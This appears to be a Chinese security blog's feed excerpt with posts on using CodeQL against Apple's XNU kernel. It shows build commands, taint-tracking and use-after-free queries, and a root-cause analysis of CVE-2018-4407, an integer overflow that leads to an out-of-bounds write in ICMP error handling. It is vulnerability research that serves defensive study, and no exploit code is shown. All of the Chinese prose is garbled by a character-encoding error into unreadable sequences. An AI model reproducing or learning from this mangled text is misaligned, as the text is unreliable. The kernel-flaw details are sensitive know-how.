freeè°ƒç”¨çš„å‚æ•°ä½œä¸ºèµ‹å€¼è¡¨è¾¾å¼çš„å·¦å€¼</code> è¿™æ¡çº¦æŸï¼Œä½†æ˜¯åŠ ä¸Šä¹‹åå°±æ‰¾ä¸åˆ°ä»»ä½•ç»“æœäº†ï¼Œå¦‚æœæœ‰äººçŸ¥é“åŸå› è¿˜è¯·æŒ‡ç‚¹ä¸€ä¸‹ : )</p><h2 id="query-2"><a href="#query-2" class="headerlink" title="query 2"></a>query 2</h2><p>ä¸Šé¢queryå¯ä»¥æ‰¾åˆ° freeåæ˜¯set NULLçš„ä»£ç æ®µï¼Œå¦‚æœæƒ³æ‰¾ä¸æ»¡è¶³æ¡ä»¶çš„ï¼Œå¯ä»¥æ£€æµ‹freeé€»è¾‘ä¸‹ä¸€è¡Œæ˜¯ä¸æ˜¯ instance of AssignExprï¼Œå½“ç„¶è¿™æ ·æ¯”è¾ƒç²—ç³™ï¼Œä¼šå­˜åœ¨è¯¯æŠ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from FunctionCall call, Expr e</span><br><span class="line">where call.getTarget().getName().regexpMatch(<span class="string">&quot;.*free.*?&quot;</span>) <span class="keyword">and</span></span><br><span class="line">    call.getEnclosingBlock() = e.getEnclosingBlock() <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">not</span>(e instanceof AssignExpr ) <span class="keyword">and</span></span><br><span class="line">    call.getLocation().getStartLine() + <span class="number">1</span> =  e.getLocation().getStartLine()</span><br><span class="line">select call, call.getEnclosingFunction().getName(), call.getArgument(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>è¿™æ ·å†™ï¼Œè™½ç„¶å¯ä»¥æ‰¾åˆ°ç›®æ ‡ä»£ç ï¼Œä½†æ˜¯å­˜åœ¨è¯¯æŠ¥ï¼ˆä¼˜åŒ–TODOï¼‰ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/sockpuppet1/query2.png" alt="Issue%201806%20XNU%20Use-after-free%20due%20to%20stale%20pointer%20a2555a06c23846e09d40b51e696047aa/Untitled%204.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Basic&quot;&gt;&lt;a href=&quot;#Basic&quot; class=&quot;headerlink&quot; title=&quot;Basic&quot;&gt;&lt;/a&gt;Basic&lt;/h1&gt;&lt;p&gt;  è¿™ä¸ªæ¼æ´æ˜¯ç”±pj0çš„ &lt;code&gt;nedwill&lt;/code&gt; å‘ç°çš„ï¼Œè€Œä¸”æ˜¯ä¸€ä¸ªå“ç›¸æä½³çš„å¯ä»¥ç”¨äºè¶Šç‹±çš„æ¼æ´ï¼Œæœ¬æ–‡åªæ˜¯å¯¹æ¼æ´è¿›è¡Œåˆ†æï¼Œå¹¶ä¸”æ€è€ƒ/å°è¯•ä½¿ç”¨CodeQLå¯¹è¯¥ç±»å‹æ¼æ´è¦†ç›–ã€‚å½“ç„¶ï¼Œåœ¨çœ‹äº†åŸä½œè€…çš„&lt;a href=&quot;https://googleprojectzero.blogspot.com/2019/12/sockpuppet-walkthrough-of-kernel.html&quot;&gt;æ–‡ç« &lt;/a&gt;ä¹‹åï¼Œæ‰å‘ç°nedwillæ˜¯åˆ©ç”¨Fuzzingçš„æ‰‹æ®µå‘ç°çš„è¿™ä¸ªæ¼æ´ï¼Œå¹¶ä¸”åœ¨æŒ–æ˜è¯»/å†™åŸè¯­çš„æ—¶å€™ä¹Ÿæ˜¯å€ŸåŠ©äº†Fuzzingçš„æ‰‹æ®µï¼Œå¯ä»¥è¯´ååˆ†çš„å·§å¦™å’Œé«˜æ•ˆäº†ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="https://o0xmuhe.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="æ¼æ´åˆ†æ" scheme="https://o0xmuhe.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    <category term="macOS" scheme="https://o0xmuhe.github.io/tags/macOS/"/>
    
    <category term="XNU" scheme="https://o0xmuhe.github.io/tags/XNU/"/>
    
    <category term="CodeQL" scheme="https://o0xmuhe.github.io/tags/CodeQL/"/>
    
    <category term="iOS" scheme="https://o0xmuhe.github.io/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL + XNU From 0 to 1</title>
    <link href="https://o0xmuhe.github.io/2021/02/15/CodeQL-XNU-From-0-to-1/"/>
    <id>https://o0xmuhe.github.io/2021/02/15/CodeQL-XNU-From-0-to-1/</id>
    <published>2021-02-15T09:04:33.000Z</published>
    <updated>2021-07-30T15:58:29.027Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><p><strong>æœ¬æ–‡å±äºå­¦ä¹ è¿‡ç¨‹ä¸­çš„ç¬”è®°ï¼ŒåŸºæœ¬ä¸Šæ˜¯æŠŠç°æœ‰çš„ç›¸å…³èµ„æ–™æ•´åˆåˆ°ä¸€èµ·ï¼Œé˜…è¯»å·²æœ‰åšå®¢/æ–‡ç« å¹¶å¤ç°ï¼ŒåŠ å…¥ä¸€äº›è‡ªå·±çš„æƒ³æ³•åè®°å½•ä¸‹æ¥çš„äº§ç‰©ã€‚</strong></p><p>build XNU è¿‡ç¨‹æ¥è‡ªæŸå¤§ä½¬çš„åšå®¢ï¼Œ<code>build xnu with codeql</code>è¿‡ç¨‹æ¥è‡ª<code>github</code></p><span id="more"></span><hr><p><strong>UPDATE</strong> </p><p>2021.3.7 æ›´æ–°ï¼Œæˆ‘åœ¨big surä¸Šbuild <code>xnu-7195.81.3</code> ä¹Ÿæ˜¯é‡åˆ°äº†pythonæƒé™çš„é—®é¢˜ï¼Œä½¿ç”¨virtualenvçš„æ–¹å¼è§£å†³äº†ã€‚</p><hr><ul><li>å¦‚æœæ˜¯è€ç‰ˆæœ¬ï¼Œå»ºè®®å…ˆæœä¸€ä¸‹æœ‰æ²¡æœ‰ç°æˆçš„databaseå¯ä»¥ç”¨ã€‚</li><li>å¦‚æœæ‰¾ä¸åˆ°ï¼Œå¯¹äºç‰ˆæœ¬è·¨åº¦æ¯”è¾ƒå¤§çš„æƒ…å†µï¼Œè¿˜æ˜¯è™šæ‹Ÿæœº+è€ç‰ˆæœ¬Xcodeæ¯”è¾ƒç¨³ã€‚</li></ul><p><a href="https://kernelshaman.blogspot.com/2021/01/building-xnu-for-macos-big-sur-1101.html">Building XNU for macOS Big Sur 11.0.1 (Intel)</a></p><p><a href="https://github.com/D4rkD0g/boringforever/blob/main/xnu/boringanalysis/aliyuncs.com/img/codeql_xnu/codeql-xnu_xnu.md">D4rkD0g/boringforever</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://jeremya.com/sw/Makefile.xnudeps &gt; Makefile.xnudeps</span><br><span class="line">make -f Makefile.xnudeps</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">XNU is now ready to build!</span><br><span class="line"></span><br><span class="line">To build the kernel <span class="keyword">for</span> supported x86_64 machines:</span><br><span class="line"><span class="built_in">cd</span> xnu-7195.81.3</span><br><span class="line">make SDKROOT=macosx TARGET_CONFIGS=<span class="string">&quot;RELEASE X86_64 NONE&quot;</span></span><br><span class="line"></span><br><span class="line">To build <span class="keyword">for</span> supported arm64e machines you can, e.g.:</span><br><span class="line"><span class="built_in">cd</span> xnu-7195.81.3</span><br><span class="line">make SDKROOT=macosx KDKROOT=/path/to/KDK TARGET_CONFIGS=<span class="string">&quot;RELEASE ARM64 T8101&quot;</span></span><br><span class="line"></span><br><span class="line">For a table of supported arm64 products, visit:</span><br><span class="line">https://kernelshaman.blogspot.com/2021/02/building-xnu-for-macos-112-intel-apple.html<span class="comment">#xnu-arm64e</span></span><br><span class="line"></span><br><span class="line">See xnu<span class="string">&#x27;s top-level README file for additional build and configuration variables</span></span><br><span class="line"><span class="string">which can be passed on the command line, e.g.,</span></span><br><span class="line"><span class="string">  Speed up the build with: BUILD_LTO=0</span></span><br><span class="line"><span class="string">  Build the development kernel with: KERNEL_CONFIGS=DEVELOPMENT</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Use LOGCOLORS=y to colorize the output</span></span><br><span class="line"><span class="string">Use CONCISE=y to keep all the build output on a single line</span></span><br><span class="line"><span class="string">--------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> xnu-7195.81.3</span><br><span class="line">// æ­£å¸¸ç¼–è¯‘xnuçš„å‘½ä»¤</span><br><span class="line">make SDKROOT=macosx TARGET_CONFIGS=<span class="string">&quot;RELEASE X86_64 NONE&quot;</span></span><br><span class="line">// ä½¿ç”¨codeqlç¼–è¯‘å‘½ä»¤</span><br><span class="line">codeql database create xnu-database --language=cpp --<span class="built_in">command</span>=<span class="string">&quot;make SDKROOT=macosx ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=RELEASE&quot;</span></span><br></pre></td></tr></table></figure><p>å‰©ä¸‹çš„å°±æ˜¯ç­‰äº†:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled.png"></p><p>éšåå¯ä»¥å¯¼å…¥æ•°æ®åº“åˆ°vscodeä¸­ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨codecli</p><ul><li>é‡åˆ°çš„é—®é¢˜1 ï¼š <code>env: python : Permisson denied</code></li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%201.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%201.png"></p><p>è§£å†³ï¼šå¯ä»¥å°è¯•æ›´æ¢xcodeç‰ˆæœ¬æ¥å°è¯•ï¼Œæˆ‘ä¹Ÿè¯•è¿‡ä½¿ç”¨rootæˆ–è€…ä½¿ç”¨python virtualenvæ¥è§„é¿é—®é¢˜ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸è¡Œã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%202.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%202.png"></p><p>Queryæµ‹è¯•</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%203.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%203.png"></p><h2 id="Case-study"><a href="#Case-study" class="headerlink" title="Case study"></a>Case study</h2><h3 id="CVE-2018-4407-ping-ping-ping"><a href="#CVE-2018-4407-ping-ping-ping" class="headerlink" title="CVE-2018-4407 - ping ping ping"></a>CVE-2018-4407 - ping ping ping</h3><h4 id="Setup-env"><a href="#Setup-env" class="headerlink" title="Setup env"></a>Setup env</h4><p><a href="https://securitylab.github.com/research/apple-xnu-icmp-error-CVE-2018-4407">Kernel crash caused by out-of-bounds write in Appleâ€™s ICMP packet-handling code (CVE-2018-4407) - GitHub Security Lab</a></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%204.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%204.png"></p><p>ä»¥10.13.6ä¸ºä¾‹</p><p>éœ€è¦ä½ç‰ˆæœ¬çš„xcodeæ¥ç¼–è¯‘ï¼Œç›´æ¥å» <a href="https://developer.apple.com/download/more/"><code>https://developer.apple.com/download/more/</code></a> ä¸‹è½½å³å¯ã€‚</p><p>æ„å»º <code>codeql xnu database</code> :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// è€ç‰ˆæœ¬ xcode</span><br><span class="line"></span><br><span class="line">make -f Makefile.xnudeps macos_version=10.13.6  xnudeps</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="find-by-codeql"><a href="#find-by-codeql" class="headerlink" title="find by codeql"></a>find by codeql</h4><p>å¯¼å…¥ <code>xnu 10.13.6</code> çš„databaseåï¼Œå…ˆçœ‹åŸä½œè€…çš„queryï¼Œå°è¯•ç†è§£ä»–çš„æ€è·¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @name mbuf copydata with tainted size</span></span><br><span class="line"><span class="comment"> * @description Calling m_copydata with an untrusted size argument</span></span><br><span class="line"><span class="comment"> *              could cause a buffer overflow.</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> * @id apple-xnu/cpp/mbuf-copydata-with-tainted-size</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> <span class="title">extends</span> <span class="title">TaintTracking</span>:</span>:Configuration &#123;</span><br><span class="line">  Config() &#123; <span class="keyword">this</span> = <span class="string">&quot;tcphdr_flow&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source.asExpr().(FunctionCall).getTarget().getName() = <span class="string">&quot;m_mtod&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists (FunctionCall call</span><br><span class="line">    | call.getArgument(<span class="number">2</span>) = sink.asExpr() <span class="keyword">and</span></span><br><span class="line">      call.getTarget().getName().matches(<span class="string">&quot;%copydata&quot;</span>))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, <span class="string">&quot;m_copydata with tainted size.&quot;</span></span><br></pre></td></tr></table></figure><p>åŸä½œè€…ä½¿ç”¨äº†æ±¡ç‚¹åˆ†ææ¥è¿½è¸ªm_mtodè°ƒç”¨åˆ° copydata é•¿åº¦å‚æ•°ã€‚</p><p>è¯´ä¸‹å…·ä½“çš„source sinkçš„æè¿°æŠŠï¼š</p><p>source ï¼š æ•°æ®æµèµ·ç‚¹ï¼Œæ˜¯ä¸€ä¸ª å‡½æ•°è°ƒç”¨(functioncall)ï¼Œå¹¶ä¸”è¯¥å‡½æ•°æ˜¯ <code>m_mtod</code></p><p>sink : â€œç»ˆç‚¹â€ï¼ˆå¯ä»¥è¿™ä¹ˆç†è§£å§ï¼‰ï¼Œæ˜¯ <code>copydata</code> å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå‡½æ•°ååŒ¹é…ä½¿ç”¨äº†æ­£åˆ™ï¼Œèƒ½åŒ¹é…åˆ° <code>copydata</code> ç³»åˆ—ã€‚</p><p>ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%205.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%205.png"></p><p>æˆ‘è®¤ä¸ºéš¾ç‚¹å¹¶ä¸æ˜¯å¦‚ä½•å†™æ±¡ç‚¹åˆ†æçš„queryï¼Œéš¾ç‚¹åº”è¯¥æ˜¯ åˆ†æå°±ç»“æœç„¶å<strong>æ„é€ poc</strong></p><h4 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><p>ä»è¡¨è±¡æ¥çœ‹æ¼æ´å‡ºåœ¨ <code>m_copydata(n, 0, icmplen, (caddr_t)&amp;icp-&gt;icmp_ip);</code></p><p><a href="https://sourcegraph.com/github.com/apple/darwin-xnu@0a798f6738bc1db01281fc08ae024145e84df927/-/blob/bsd/netinet/ip_icmp.c#L339">ip_icmp.c - apple/darwin-xnu - Sourcegraph</a></p><p>çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªcopyæ•°æ®çš„æ—¶å€™æ²¡æœ‰å¯¹è¾¹ç•Œè¿›è¡Œæ£€æŸ¥çš„â€œç®€å•çš„â€œæ¼æ´ï¼Œä½†æ˜¯Ian beerç»™ä½œè€…é‚®ä»¶è§£é‡Šäº†root casueï¼Œè¿™ä¸ªæ¼æ´å‘ç”Ÿçš„æœ¬è´¨åŸå› å¹¶ä¸æ˜¯è¿™ä¸ªåœ°æ–¹ã€‚</p><p>é¦–å…ˆçœ‹å‡ºç°æ¼æ´çš„å‡½æ•°ä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Generate an error packet of <span class="built_in">type</span> error</span><br><span class="line"> * <span class="keyword">in</span> response to bad packet ip.</span><br><span class="line"> */</span><br><span class="line">void</span><br><span class="line">icmp_error(</span><br><span class="line">    struct mbuf *n,</span><br><span class="line">    int <span class="built_in">type</span>,</span><br><span class="line">    int code,</span><br><span class="line">    u_int32_t dest,</span><br><span class="line">    u_int32_t nextmtu)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°æ˜¯å¤„ç†â€œæœ‰é—®é¢˜çš„IPåŒ…â€çš„ï¼Œè¿”å›ä¸€ä¸ªâ€œerror packetâ€ç»™å‘é€è€…ï¼Œç›¸å½“äºï¼šå‘ç°å‘è¿‡æ¥çš„IPåŒ…æœ‰é—®é¢˜ä¹‹åï¼Œç”Ÿæˆä¸€ä¸ªé”™è¯¯ä¿¡æ¯è¿”å›ç»™å‘é€è€…ã€‚</p><p>ä¸Šé¢çš„copyå‡½æ•°æ˜¯å¤åˆ¶åŸæœ¬IPåŒ…åŒ…å¤´çš„ä¿¡æ¯å¤åˆ¶åˆ°è¿”å›åŒ…ä¸­ï¼Œå‡ºç°äº†é—®é¢˜ã€‚æ ¹æ®Ian beerçš„è§£é‡Šï¼š</p><p>æ¼æ´å®é™…å‘ç”Ÿåœ¨æ›´æ—©çš„åœ°æ–¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icp-&gt;icmp_type = <span class="built_in">type</span>;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±è¦æŠŠè¿™ä¸ªå‡½æ•°ä»å¤´å¼€å§‹åˆ†æä¸€ä¸‹äº†ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ï¼šæœ‰é—®é¢˜çš„æ•°æ®åŒ…åœ¨å“ªé‡Œè¿›æ¥çš„ï¼Œåœ¨å“ªé‡Œè¢«å¤„ç†çš„ï¼Œæœ€ç»ˆæ€ä¹ˆèµ°åˆ°copyçš„é€»è¾‘çš„ã€‚</p><p>æºå¤´ï¼š <code>struct mbuf *n</code>   è¡¨ç¤ºæœ‰é—®é¢˜çš„æ•°æ®åŒ…ï¼ˆincoming packet)ï¼Œä¸‹é¢è´´ä¸€ä¸‹ <code>mbuf</code> ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The mbuf object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">m_hdr</span> <span class="title">m_hdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pkthdr</span> <span class="title">MH_pkthdr</span>;</span>    <span class="comment">/* M_PKTHDR set */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">m_ext</span> <span class="title">MH_ext</span>;</span>    <span class="comment">/* M_EXT set */</span></span><br><span class="line">                <span class="keyword">char</span>    MH_databuf[_MHLEN];</span><br><span class="line">            &#125; MH_dat;</span><br><span class="line">        &#125; MH;</span><br><span class="line">        <span class="keyword">char</span>    M_databuf[_MLEN];        <span class="comment">/* !M_PKTHDR, !M_EXT */</span></span><br><span class="line">    &#125; M_dat;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿”å›çš„æ•°æ®åŒ…ï¼š <code>struct mbuf *m</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (MHLEN &gt; (<span class="keyword">sizeof</span>(struct ip) + ICMP_MINLEN + icmplen))</span><br><span class="line">        m = m_gethdr(M_DONTWAIT, MT_HEADER);    <span class="comment">/* MAC-OK */</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        m = m_getcl(M_DONTWAIT, MT_DATA, M_PKTHDR);</span><br></pre></td></tr></table></figure><p>mçš„åˆ†é…å’Œ <code>icmplen</code>  ç›¸å…³ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nlen = m_length(n);</span><br><span class="line">...</span><br><span class="line">icmplen = min(oiphlen + icmpelen, min(nlen, oip-&gt;ip_len));</span><br></pre></td></tr></table></figure><p>å¤„ç†ï¼š <code>m-&gt;m_len = icmplen + ICMP_MINLEN;</code></p><p>è¿™é‡Œçœ‹èµ·æ¥è¿˜æ²¡æœ‰é—®é¢˜ï¼Œè®¡ç®—è¿”å›åŒ…mçš„é•¿åº¦ï¼›</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MH_ALIGN(m, m-&gt;m_len); <span class="comment">// å®</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å±•å¼€ä¹‹åï¼š</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * As above, for mbufs allocated with m_gethdr/MGETHDR</span></span><br><span class="line"><span class="comment"> * or initialized by M_COPY_PKTHDR.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    MH_ALIGN(m, len)                        \</span></span><br><span class="line"><span class="meta">do &#123;                                    \</span></span><br><span class="line"><span class="meta">    (m)-&gt;m_data += (MHLEN - (len)) &amp;~ (sizeof (long) - 1);        \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå®å¹¶æ²¡æœ‰æ£€æŸ¥ MHLEN å’Œ len çš„å¤§å°å…³ç³»ï¼Œè¿™é‡Œæ˜¯æœ‰æ•´æ•°æº¢å‡ºçš„ã€‚</p><p>åœ¨è¿™ä¸ªåœºæ™¯é‡Œï¼Œ <code>MHLEN</code> æ˜¯ 88ï¼Œ lenæ˜¯ mâ†’m_lenï¼Œä¹Ÿå°±æ˜¯ <code>icmplen + ICMP_MINLEN;</code> ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ <code>icmplen</code> å¤§äº80ï¼Œè¿™é‡Œå°±å¯ä»¥è§¦å‘æ•´æ•°æº¢å‡ºï¼Œ m_data æŒ‡å‘äº†å…¶ä»–ä½ç½®ã€‚</p><p>éšåä½¿ç”¨åˆ°è¿™ä¸ª <code>å·²ç»æ•´æ•°æº¢å‡º</code> çš„é•¿åº¦çš„åœ°æ–¹ï¼Œå¹¶ä¸æ˜¯copyçš„é€»è¾‘ï¼Œè€Œæ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icp = mtod(m, struct icmp *);</span><br><span class="line">icp-&gt;icmp_type = type; <span class="comment">// oob write here</span></span><br></pre></td></tr></table></figure><p><code>mtod</code> åªæ˜¯è¿”å›äº† <code>mbuf</code> çš„ data æŒ‡é’ˆ</p><p>å®ä¸€æ­¥ä¸€æ­¥å±•å¼€ä¹‹åï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    mtod(m, t)    ((t)m_mtod(m))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">m_mtod</span><span class="params">(struct mbuf *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (MTOD(m, <span class="keyword">void</span> *));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Macro version of mtod.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    MTOD(m, t)    ((t)((m)-&gt;m_data))</span></span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„è¿‡ç¨‹ä¹‹åï¼ŒicpæŒ‡é’ˆæœ¬æ¥æ˜¯æŒ‡å‘ <code>m_buf</code>çš„æ•°æ®éƒ¨åˆ†</p><p>ä½†æ˜¯æ•´æ•°æº¢å‡ºä¹‹åï¼Œ<code>mâ†’m_data</code> å¢åŠ äº†ä¸€ä¸ªå¾ˆå¤§çš„å€¼(&lt;4GB)ï¼Œæœ€ç»ˆåœ¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icp-&gt;</span><br><span class="line">icmp_type = type; </span><br></pre></td></tr></table></figure><p>å°±å‘ç”Ÿäº†è¶Šè§£å†™ï¼Œ<code>root case</code> åˆ†æå®Œæ¯•ã€‚</p><h4 id="about-PATCH"><a href="#about-PATCH" class="headerlink" title="about PATCH"></a>about PATCH</h4><p>å…ˆè¯´ä¸ªäººç†è§£ï¼Œç›´æ¥å¯¹ incoming 